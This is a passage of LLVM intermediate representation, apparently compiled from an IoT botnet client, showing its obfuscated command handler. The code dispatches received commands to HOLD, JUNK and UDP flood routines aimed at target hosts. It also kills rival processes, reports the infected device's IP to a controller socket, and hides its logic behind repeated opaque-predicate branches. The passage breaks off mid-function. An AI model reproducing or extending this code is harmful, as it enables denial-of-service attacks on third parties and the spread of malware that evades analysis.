  %96 = call i32 @strcmp(i8* %95, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.110, i32 0, i32 0)) #10
  %97 = icmp ne i32 %96, 0
  %98 = load i32, i32* @x.77
  %99 = load i32, i32* @y.78
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %97, label %110, label %106

; <label>:106:                                    ; preds = %originalBBpart28
  call void @UpdateBins()
  %107 = load i32, i32* @pgid, align 4
  %108 = mul nsw i32 %107, -1
  %109 = call i32 @kill(i32 %108, i32 9) #2
  call void @exit(i32 0) #14
  unreachable

; <label>:110:                                    ; preds = %originalBBpart28
  %111 = load i32, i32* @x.77
  %112 = load i32, i32* @y.78
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %110
  %119 = load i8**, i8*** %12, align 8
  %120 = getelementptr inbounds i8*, i8** %119, i64 0
  %121 = load i8*, i8** %120, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.111, i32 0, i32 0)) #10
  %123 = icmp ne i32 %122, 0
  %124 = load i32, i32* @x.77
  %125 = load i32, i32* @y.78
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %123, label %185, label %132

; <label>:132:                                    ; preds = %originalBBpart212
  %133 = load i32, i32* @x.77
  %134 = load i32, i32* @y.78
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %132
  %141 = load i8**, i8*** %12, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 1
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @strcmp(i8* %143, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0)) #10
  %145 = icmp ne i32 %144, 0
  %146 = load i32, i32* @x.77
  %147 = load i32, i32* @y.78
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %145, label %174, label %154

; <label>:154:                                    ; preds = %originalBBpart216
  %155 = load i32, i32* @x.77
  %156 = load i32, i32* @y.78
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %154
  %163 = call i32 (...) @killer_kill()
  %164 = load i32, i32* @mainCommSock, align 4
  %165 = call i32 (i32, i8*, ...) @sockprintf(i32 %164, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.113, i32 0, i32 0))
  %166 = load i32, i32* @x.77
  %167 = load i32, i32* @y.78
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %174

; <label>:174:                                    ; preds = %originalBBpart220, %originalBBpart216
  %175 = load i8**, i8*** %12, align 8
  %176 = getelementptr inbounds i8*, i8** %175, i64 1
  %177 = load i8*, i8** %176, align 8
  %178 = call i32 @strcmp(i8* %177, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i32 0, i32 0)) #10
  %179 = icmp ne i32 %178, 0
  br i1 %179, label %184, label %180

; <label>:180:                                    ; preds = %174
  %181 = call i32 (...) @killer_init()
  %182 = load i32, i32* @mainCommSock, align 4
  %183 = call i32 (i32, i8*, ...) @sockprintf(i32 %182, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.115, i32 0, i32 0))
  br label %184

; <label>:184:                                    ; preds = %180, %174
  br label %1553

; <label>:185:                                    ; preds = %originalBBpart212
  %186 = load i8**, i8*** %12, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 0
  %188 = load i8*, i8** %187, align 8
  %189 = call i32 @strcmp(i8* %188, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.116, i32 0, i32 0)) #10
  %190 = icmp ne i32 %189, 0
  br i1 %190, label %212, label %191

; <label>:191:                                    ; preds = %185
  %192 = load i32, i32* @x.77
  %193 = load i32, i32* @y.78
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %191
  %200 = load i32, i32* @mainCommSock, align 4
  %201 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %202 = call i8* @inet_ntoa(i32 %201) #2
  %203 = call i32 (i32, i8*, ...) @sockprintf(i32 %200, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.117, i32 0, i32 0), i8* %202)
  %204 = load i32, i32* @x.77
  %205 = load i32, i32* @y.78
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %1553

; <label>:212:                                    ; preds = %185
  %213 = load i8**, i8*** %12, align 8
  %214 = getelementptr inbounds i8*, i8** %213, i64 0
  %215 = load i8*, i8** %214, align 8
  %216 = call i32 @strcmp(i8* %215, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.118, i32 0, i32 0)) #10
  %217 = icmp ne i32 %216, 0
  br i1 %217, label %290, label %218

; <label>:218:                                    ; preds = %212
  %219 = load i32, i32* %11, align 4
  %220 = icmp slt i32 %219, 4
  br i1 %220, label %233, label %221

; <label>:221:                                    ; preds = %218
  %222 = load i8**, i8*** %12, align 8
  %223 = getelementptr inbounds i8*, i8** %222, i64 2
  %224 = load i8*, i8** %223, align 8
  %225 = call i32 @atoi(i8* %224) #10
  %226 = icmp slt i32 %225, 1
  br i1 %226, label %233, label %227

; <label>:227:                                    ; preds = %221
  %228 = load i8**, i8*** %12, align 8
  %229 = getelementptr inbounds i8*, i8** %228, i64 3
  %230 = load i8*, i8** %229, align 8
  %231 = call i32 @atoi(i8* %230) #10
  %232 = icmp slt i32 %231, 1
  br i1 %232, label %233, label %234

; <label>:233:                                    ; preds = %227, %221, %218
  br label %1553

; <label>:234:                                    ; preds = %227
  %235 = load i8**, i8*** %12, align 8
  %236 = getelementptr inbounds i8*, i8** %235, i64 1
  %237 = load i8*, i8** %236, align 8
  store i8* %237, i8** %13, align 8
  %238 = load i8**, i8*** %12, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 2
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @atoi(i8* %240) #10
  store i32 %241, i32* %14, align 4
  %242 = load i8**, i8*** %12, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 3
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #10
  store i32 %245, i32* %15, align 4
  %246 = load i8*, i8** %13, align 8
  %247 = call i8* @strstr(i8* %246, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %248 = icmp ne i8* %247, null
  br i1 %248, label %249, label %265

; <label>:249:                                    ; preds = %234
  %250 = load i8*, i8** %13, align 8
  %251 = call i8* @strtok(i8* %250, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %251, i8** %16, align 8
  br label %252

; <label>:252:                                    ; preds = %262, %249
  %253 = load i8*, i8** %16, align 8
  %254 = icmp ne i8* %253, null
  br i1 %254, label %255, label %264

; <label>:255:                                    ; preds = %252
  %256 = call i32 @listFork()
  %257 = icmp ne i32 %256, 0
  br i1 %257, label %262, label %258

; <label>:258:                                    ; preds = %255
  %259 = load i8*, i8** %16, align 8
  %260 = load i32, i32* %14, align 4
  %261 = load i32, i32* %15, align 4
  call void @sendHOLD(i8* %259, i32 %260, i32 %261)
  call void @_exit(i32 0) #12
  unreachable

; <label>:262:                                    ; preds = %255
  %263 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %263, i8** %16, align 8
  br label %252

; <label>:264:                                    ; preds = %252
  br label %273

; <label>:265:                                    ; preds = %234
  %266 = call i32 @listFork()
  %267 = icmp ne i32 %266, 0
  br i1 %267, label %268, label %269

; <label>:268:                                    ; preds = %265
  br label %1553

; <label>:269:                                    ; preds = %265
  %270 = load i8*, i8** %13, align 8
  %271 = load i32, i32* %14, align 4
  %272 = load i32, i32* %15, align 4
  call void @sendHOLD(i8* %270, i32 %271, i32 %272)
  call void @_exit(i32 0) #12
  unreachable

; <label>:273:                                    ; preds = %264
  %274 = load i32, i32* @x.77
  %275 = load i32, i32* @y.78
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %273
  %282 = load i32, i32* @x.77
  %283 = load i32, i32* @y.78
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %1553

; <label>:290:                                    ; preds = %212
  %291 = load i8**, i8*** %12, align 8
  %292 = getelementptr inbounds i8*, i8** %291, i64 0
  %293 = load i8*, i8** %292, align 8
  %294 = call i32 @strcmp(i8* %293, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i32 0, i32 0)) #10
  %295 = icmp ne i32 %294, 0
  br i1 %295, label %418, label %296

; <label>:296:                                    ; preds = %290
  %297 = load i32, i32* %11, align 4
  %298 = icmp slt i32 %297, 4
  br i1 %298, label %327, label %299

; <label>:299:                                    ; preds = %296
  %300 = load i32, i32* @x.77
  %301 = load i32, i32* @y.78
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %299
  %308 = load i8**, i8*** %12, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 2
  %310 = load i8*, i8** %309, align 8
  %311 = call i32 @atoi(i8* %310) #10
  %312 = icmp slt i32 %311, 1
  %313 = load i32, i32* @x.77
  %314 = load i32, i32* @y.78
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %312, label %327, label %321

; <label>:321:                                    ; preds = %originalBBpart232
  %322 = load i8**, i8*** %12, align 8
  %323 = getelementptr inbounds i8*, i8** %322, i64 3
  %324 = load i8*, i8** %323, align 8
  %325 = call i32 @atoi(i8* %324) #10
  %326 = icmp slt i32 %325, 1
  br i1 %326, label %327, label %328

; <label>:327:                                    ; preds = %321, %originalBBpart232, %296
  br label %1553

; <label>:328:                                    ; preds = %321
  %329 = load i8**, i8*** %12, align 8
  %330 = getelementptr inbounds i8*, i8** %329, i64 1
  %331 = load i8*, i8** %330, align 8
  store i8* %331, i8** %17, align 8
  %332 = load i8**, i8*** %12, align 8
  %333 = getelementptr inbounds i8*, i8** %332, i64 2
  %334 = load i8*, i8** %333, align 8
  %335 = call i32 @atoi(i8* %334) #10
  store i32 %335, i32* %18, align 4
  %336 = load i8**, i8*** %12, align 8
  %337 = getelementptr inbounds i8*, i8** %336, i64 3
  %338 = load i8*, i8** %337, align 8
  %339 = call i32 @atoi(i8* %338) #10
  store i32 %339, i32* %19, align 4
  %340 = load i8*, i8** %17, align 8
  %341 = call i8* @strstr(i8* %340, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %342 = icmp ne i8* %341, null
  br i1 %342, label %343, label %377

; <label>:343:                                    ; preds = %328
  %344 = load i8*, i8** %17, align 8
  %345 = call i8* @strtok(i8* %344, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %345, i8** %20, align 8
  br label %346

; <label>:346:                                    ; preds = %374, %343
  %347 = load i8*, i8** %20, align 8
  %348 = icmp ne i8* %347, null
  br i1 %348, label %349, label %376

; <label>:349:                                    ; preds = %346
  %350 = load i32, i32* @x.77
  %351 = load i32, i32* @y.78
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %349
  %358 = call i32 @listFork()
  %359 = icmp ne i32 %358, 0
  %360 = load i32, i32* @x.77
  %361 = load i32, i32* @y.78
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %359, label %374, label %368

; <label>:368:                                    ; preds = %originalBBpart236
  %369 = load i8*, i8** %20, align 8
  %370 = load i32, i32* %18, align 4
  %371 = load i32, i32* %19, align 4
  call void @sendJUNK(i8* %369, i32 %370, i32 %371)
  %372 = load i32, i32* @mainCommSock, align 4
  %373 = call i32 @close(i32 %372)
  call void @_exit(i32 0) #12
  unreachable

; <label>:374:                                    ; preds = %originalBBpart236
  %375 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %375, i8** %20, align 8
  br label %346

; <label>:376:                                    ; preds = %346
  br label %401

; <label>:377:                                    ; preds = %328
  %378 = call i32 @listFork()
  %379 = icmp ne i32 %378, 0
  br i1 %379, label %380, label %381

; <label>:380:                                    ; preds = %377
  br label %1553

; <label>:381:                                    ; preds = %377
  %382 = load i32, i32* @x.77
  %383 = load i32, i32* @y.78
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %381
  %390 = load i8*, i8** %17, align 8
  %391 = load i32, i32* %18, align 4
  %392 = load i32, i32* %19, align 4
  call void @sendJUNK(i8* %390, i32 %391, i32 %392)
  call void @_exit(i32 0) #12
  %393 = load i32, i32* @x.77
  %394 = load i32, i32* @y.78
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  unreachable

; <label>:401:                                    ; preds = %376
  %402 = load i32, i32* @x.77
  %403 = load i32, i32* @y.78
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %401
  %410 = load i32, i32* @x.77
  %411 = load i32, i32* @y.78
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %1553

; <label>:418:                                    ; preds = %290
  %419 = load i8**, i8*** %12, align 8
  %420 = getelementptr inbounds i8*, i8** %419, i64 0
  %421 = load i8*, i8** %420, align 8
  %422 = call i32 @strcmp(i8* %421, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.120, i32 0, i32 0)) #10
  %423 = icmp ne i32 %422, 0
  br i1 %423, label %679, label %424

; <label>:424:                                    ; preds = %418
  %425 = load i32, i32* %11, align 4
  %426 = icmp slt i32 %425, 6
  br i1 %426, label %526, label %427

; <label>:427:                                    ; preds = %424
  %428 = load i32, i32* @x.77
  %429 = load i32, i32* @y.78
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %427
  %436 = load i8**, i8*** %12, align 8
  %437 = getelementptr inbounds i8*, i8** %436, i64 3
  %438 = load i8*, i8** %437, align 8
  %439 = call i32 @atoi(i8* %438) #10
  %440 = icmp eq i32 %439, -1
  %441 = load i32, i32* @x.77
  %442 = load i32, i32* @y.78
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %440, label %526, label %449

; <label>:449:                                    ; preds = %originalBBpart248
  %450 = load i32, i32* @x.77
  %451 = load i32, i32* @y.78
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %449
  %458 = load i8**, i8*** %12, align 8
  %459 = getelementptr inbounds i8*, i8** %458, i64 2
  %460 = load i8*, i8** %459, align 8
  %461 = call i32 @atoi(i8* %460) #10
  %462 = icmp eq i32 %461, -1
  %463 = load i32, i32* @x.77
  %464 = load i32, i32* @y.78
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %462, label %526, label %471

; <label>:471:                                    ; preds = %originalBBpart252
  %472 = load i8**, i8*** %12, align 8
  %473 = getelementptr inbounds i8*, i8** %472, i64 4
  %474 = load i8*, i8** %473, align 8
  %475 = call i32 @atoi(i8* %474) #10
  %476 = icmp eq i32 %475, -1
  br i1 %476, label %526, label %477

; <label>:477:                                    ; preds = %471
  %478 = load i8**, i8*** %12, align 8
  %479 = getelementptr inbounds i8*, i8** %478, i64 5
  %480 = load i8*, i8** %479, align 8
  %481 = call i32 @atoi(i8* %480) #10
  %482 = icmp eq i32 %481, -1
  br i1 %482, label %526, label %483

; <label>:483:                                    ; preds = %477
  %484 = load i8**, i8*** %12, align 8
  %485 = getelementptr inbounds i8*, i8** %484, i64 5
  %486 = load i8*, i8** %485, align 8
  %487 = call i32 @atoi(i8* %486) #10
  %488 = icmp sgt i32 %487, 65536
  br i1 %488, label %526, label %489

; <label>:489:                                    ; preds = %483
  %490 = load i8**, i8*** %12, align 8
  %491 = getelementptr inbounds i8*, i8** %490, i64 5
  %492 = load i8*, i8** %491, align 8
  %493 = call i32 @atoi(i8* %492) #10
  %494 = icmp sgt i32 %493, 65500
  br i1 %494, label %526, label %495

; <label>:495:                                    ; preds = %489
  %496 = load i32, i32* @x.77
  %497 = load i32, i32* @y.78
  %498 = sub i32 %496, 1
  %499 = mul i32 %496, %498
  %500 = urem i32 %499, 2
  %501 = icmp eq i32 %500, 0
  %502 = icmp slt i32 %497, 10
  %503 = or i1 %501, %502
  br i1 %503, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %495
  %504 = load i8**, i8*** %12, align 8
  %505 = getelementptr inbounds i8*, i8** %504, i64 4
  %506 = load i8*, i8** %505, align 8
  %507 = call i32 @atoi(i8* %506) #10
  %508 = icmp sgt i32 %507, 32
  %509 = load i32, i32* @x.77
  %510 = load i32, i32* @y.78
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %508, label %526, label %517

; <label>:517:                                    ; preds = %originalBBpart256
  %518 = load i32, i32* %11, align 4
  %519 = icmp eq i32 %518, 7
  br i1 %519, label %520, label %527

; <label>:520:                                    ; preds = %517
  %521 = load i8**, i8*** %12, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 6
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @atoi(i8* %523) #10
  %525 = icmp slt i32 %524, 1
  br i1 %525, label %526, label %527

; <label>:526:                                    ; preds = %520, %originalBBpart256, %489, %483, %477, %471, %originalBBpart252, %originalBBpart248, %424
  br label %1553

; <label>:527:                                    ; preds = %520, %517
  %528 = load i8**, i8*** %12, align 8
  %529 = getelementptr inbounds i8*, i8** %528, i64 1
  %530 = load i8*, i8** %529, align 8
  store i8* %530, i8** %21, align 8
  %531 = load i8**, i8*** %12, align 8
  %532 = getelementptr inbounds i8*, i8** %531, i64 2
  %533 = load i8*, i8** %532, align 8
  %534 = call i32 @atoi(i8* %533) #10
  store i32 %534, i32* %22, align 4
  %535 = load i8**, i8*** %12, align 8
  %536 = getelementptr inbounds i8*, i8** %535, i64 3
  %537 = load i8*, i8** %536, align 8
  %538 = call i32 @atoi(i8* %537) #10
  store i32 %538, i32* %23, align 4
  %539 = load i8**, i8*** %12, align 8
  %540 = getelementptr inbounds i8*, i8** %539, i64 4
  %541 = load i8*, i8** %540, align 8
  %542 = call i32 @atoi(i8* %541) #10
  store i32 %542, i32* %24, align 4
  %543 = load i8**, i8*** %12, align 8
  %544 = getelementptr inbounds i8*, i8** %543, i64 5
  %545 = load i8*, i8** %544, align 8
  %546 = call i32 @atoi(i8* %545) #10
  store i32 %546, i32* %25, align 4
  %547 = load i32, i32* %11, align 4
  %548 = icmp sgt i32 %547, 6
  br i1 %548, label %549, label %570

; <label>:549:                                    ; preds = %527
  %550 = load i32, i32* @x.77
  %551 = load i32, i32* @y.78
  %552 = sub i32 %550, 1
  %553 = mul i32 %550, %552
  %554 = urem i32 %553, 2
  %555 = icmp eq i32 %554, 0
  %556 = icmp slt i32 %551, 10
  %557 = or i1 %555, %556
  br i1 %557, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %549
  %558 = load i8**, i8*** %12, align 8
  %559 = getelementptr inbounds i8*, i8** %558, i64 6
  %560 = load i8*, i8** %559, align 8
  %561 = call i32 @atoi(i8* %560) #10
  %562 = load i32, i32* @x.77
  %563 = load i32, i32* @y.78
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %587

; <label>:570:                                    ; preds = %527
  %571 = load i32, i32* @x.77
  %572 = load i32, i32* @y.78
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %570
  %579 = load i32, i32* @x.77
  %580 = load i32, i32* @y.78
  %581 = sub i32 %579, 1
  %582 = mul i32 %579, %581
  %583 = urem i32 %582, 2
  %584 = icmp eq i32 %583, 0
  %585 = icmp slt i32 %580, 10
  %586 = or i1 %584, %585
  br i1 %586, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %587

; <label>:587:                                    ; preds = %originalBBpart264, %originalBBpart260
  %588 = phi i32 [ %561, %originalBBpart260 ], [ 1000, %originalBBpart264 ]
  store i32 %588, i32* %26, align 4
  %589 = load i32, i32* %11, align 4
  %590 = icmp sgt i32 %589, 7
  br i1 %590, label %591, label %596

; <label>:591:                                    ; preds = %587
  %592 = load i8**, i8*** %12, align 8
  %593 = getelementptr inbounds i8*, i8** %592, i64 7
  %594 = load i8*, i8** %593, align 8
  %595 = call i32 @atoi(i8* %594) #10
  br label %597

; <label>:596:                                    ; preds = %587
  br label %597

; <label>:597:                                    ; preds = %596, %591
  %598 = phi i32 [ %595, %591 ], [ 1000000, %596 ]
  store i32 %598, i32* %27, align 4
  %599 = load i32, i32* %11, align 4
  %600 = icmp sgt i32 %599, 8
  br i1 %600, label %601, label %606

; <label>:601:                                    ; preds = %597
  %602 = load i8**, i8*** %12, align 8
  %603 = getelementptr inbounds i8*, i8** %602, i64 8
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @atoi(i8* %604) #10
  br label %607

; <label>:606:                                    ; preds = %597
  br label %607

; <label>:607:                                    ; preds = %606, %601
  %608 = phi i32 [ %605, %601 ], [ 0, %606 ]
  store i32 %608, i32* %28, align 4
  %609 = load i8*, i8** %21, align 8
  %610 = call i8* @strstr(i8* %609, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %611 = icmp ne i8* %610, null
  br i1 %611, label %612, label %649

; <label>:612:                                    ; preds = %607
  %613 = load i32, i32* @x.77
  %614 = load i32, i32* @y.78
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %612
  %621 = load i8*, i8** %21, align 8
  %622 = call i8* @strtok(i8* %621, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %622, i8** %29, align 8
  %623 = load i32, i32* @x.77
  %624 = load i32, i32* @y.78
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %631

; <label>:631:                                    ; preds = %646, %originalBBpart268
  %632 = load i8*, i8** %29, align 8
  %633 = icmp ne i8* %632, null
  br i1 %633, label %634, label %648

; <label>:634:                                    ; preds = %631
  %635 = call i32 @listFork()
  %636 = icmp ne i32 %635, 0
  br i1 %636, label %646, label %637

; <label>:637:                                    ; preds = %634
  %638 = load i8*, i8** %29, align 8
  %639 = load i32, i32* %22, align 4
  %640 = load i32, i32* %23, align 4
  %641 = load i32, i32* %24, align 4
  %642 = load i32, i32* %25, align 4
  %643 = load i32, i32* %26, align 4
  %644 = load i32, i32* %27, align 4
  %645 = load i32, i32* %28, align 4
  call void @sendUDP(i8* %638, i32 %639, i32 %640, i32 %641, i32 %642, i32 %643, i32 %644, i32 %645)
  call void @_exit(i32 0) #12
  unreachable

; <label>:646:                                    ; preds = %634
  %647 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %647, i8** %29, align 8
  br label %631

; <label>:648:                                    ; preds = %631
  br label %662

; <label>:649:                                    ; preds = %607
  %650 = call i32 @listFork()
  %651 = icmp ne i32 %650, 0
